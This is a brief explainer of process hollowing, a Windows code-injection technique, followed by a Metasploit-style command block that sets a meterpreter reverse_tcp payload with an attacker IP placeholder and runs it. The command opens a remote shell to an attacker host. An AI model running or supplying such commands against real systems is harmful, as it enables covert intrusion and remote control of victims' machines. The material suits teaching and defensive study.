**Process hollowing** is a technique where an attacker starts a legitimate process in a suspended state, "hollows out" its memory, and replaces the legitimate code with malicious code (shellcode or a malicious executable). Once the malicious code is injected, the process is resumed, and from an external perspective, it appears as though a legitimate process is running, but it is executing malicious code.

```
use exploit/windows/local/process_hollowing
set payload windows/meterpreter/reverse_tcp
set lhost [attacker_ip]
set process [legitimate_process]
run

```